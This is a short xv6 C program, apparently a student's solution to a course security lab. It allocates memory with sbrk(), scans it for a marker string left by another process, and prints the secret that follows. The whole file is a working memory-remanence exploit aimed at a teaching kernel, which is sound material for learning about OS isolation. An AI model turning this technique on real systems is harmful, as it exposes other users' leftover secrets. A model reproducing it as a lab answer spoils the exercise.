#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"
#include "user.h"

#define DATASIZE (4096)
#define MAXATTEMPT (20)

void 
attack()
{
  // sbrk() to allocate memory may receive pages that have data in them from previous uses
  char *b = sbrk(DATASIZE);

  for (int i=0; i < DATASIZE; i++) {
    char *c = b + i;
    if (strcmp(c, "This may help.") == 0) {
      c += 16;
      printf("%s\n", c);
      return;
    }
  }
}

int
main(int argc, char *argv[])
{
  for (int i=0; i < MAXATTEMPT; i++) {
    attack();
  }

  return 0;
}
